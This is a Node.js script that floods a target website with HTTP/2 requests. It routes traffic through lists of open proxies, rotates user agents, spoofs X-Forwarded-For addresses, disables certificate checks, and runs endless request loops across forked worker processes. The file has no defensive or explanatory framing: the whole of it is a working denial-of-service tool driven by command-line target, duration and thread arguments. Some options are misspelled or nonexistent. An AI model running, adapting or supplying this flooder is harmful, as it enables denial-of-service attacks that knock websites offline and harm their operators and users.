require('events').EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);

const fs = require('fs');
const url = require('url');
const http = require('http');
const crypto = require('crypto');
const cluster = require('cluster');
const http2 = require('http2');
const tls = require('tls');

var UAs = fs.readFileSync('utils/ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
var proxies = fs.readFileSync('utils/http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');

let payload = {};

var objetive = process.argv[2];
var parsed = url.parse(objetive);

const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
];

let SignalsList = sigalgs.join(':');

function randomByte() {
  return Math.round(Math.random() * 256);
}

function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

  return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

class TlsBuilder {

  constructor(socket) {
    this.curve = "GREASE:X25519:x25519"; // Default
    this.sigalgs = SignalsList;
    this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
  };

  http2TUNNEL(socket) {

    socket.setKeepAlive(true, 1000);
    socket.setTimeout(15000);

    payload[":method"] = "GET";
    payload["Referer"] = objetive;
    payload["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
    payload["Cache-Control"] = 'max-age=0';
    payload['Upgrade-Insecure-Requests'] = 1;
    payload["X-Forwarded-For"] = randomIp();
    payload[":path"] = parsed.path;

    tls.DEFAULT_MAX_VERSION = 'TLSv1.3';

    tls.authorized = true;
    tls.sync = true;

    const tunnel = http2.connect(parsed.href, {
      createConnection: () => tls.connect({
        socket: socket,
        ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256" + ":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:" + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: 'TLS_method',
        host: parsed.host,
        servername: parsed.host,
        port: 80,
        secure: true,
        echdCurve: this.curve,
        honorCipherOrder: true,
        requestCert: true,
        //secureOptions: this.Opt, //"SSL_OP_ALL",
        //sigalgs: this.sigalgs,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
      }, () => {

        for (let i = 0; i < 64; i++) {

          setInterval(async () => {
            await tunnel.request(payload).close();
          });
        }
      })
    });
  }
}

BuildTLS = new TlsBuilder();

const keepAliveAgent = new http.Agent({
  keepAlive: true,
  keepAliveMsecs: 50000,
  maxSockets: Infinity,
  maxTotalSockets: Infinity,
  maxSockets: Infinity
});

function Runner() {

  for (let i = 0; i < 120; i++) {

    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    var req = http.get({
      host: proxy[0],
      port: proxy[1],
      //ciphers: `ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM`,
      timeout: 15000,
      method: "CONNECT",
      agent: keepAliveAgent,
      globalAgent: keepAliveAgent,
      path: parsed.host //+ ":443"
    });

    req.end();

    req.on('connect', (_, socket) => {
      BuildTLS.http2TUNNEL(socket);
    });

    req.on('end', () => {
      req.resume()
      req.close();
    });
  }
}

setInterval(Runner);

if (cluster.isMaster) {

  for (let i = 0; i < process.argv[4]; i++) {
    cluster.fork();
  };

};

setTimeout(function() {
  process.exit();
}, process.argv[3] * 1000);

process.on('uncaughtException', function(er) {
  //console.log(er)
});
process.on('unhandledRejection', function(er) {
  //console.log(er)
});